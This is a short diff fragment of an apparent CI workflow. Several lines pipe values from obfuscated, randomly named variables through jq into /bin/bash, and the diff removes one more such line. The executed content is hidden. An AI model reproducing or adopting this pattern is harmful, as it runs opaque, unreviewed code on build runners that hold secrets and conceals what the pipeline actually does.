@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$cl62" | jq -r .wnpg4 | /bin/bash
           echo $sf283 | jq -r .dnf23 | /bin/bash
           echo $ntld868 | jq -r .kx0661 | /bin/bash
-          echo $yg43873 | jq -r .c84 | /bin/bash
 
       - name: Store artifact
         if: always()
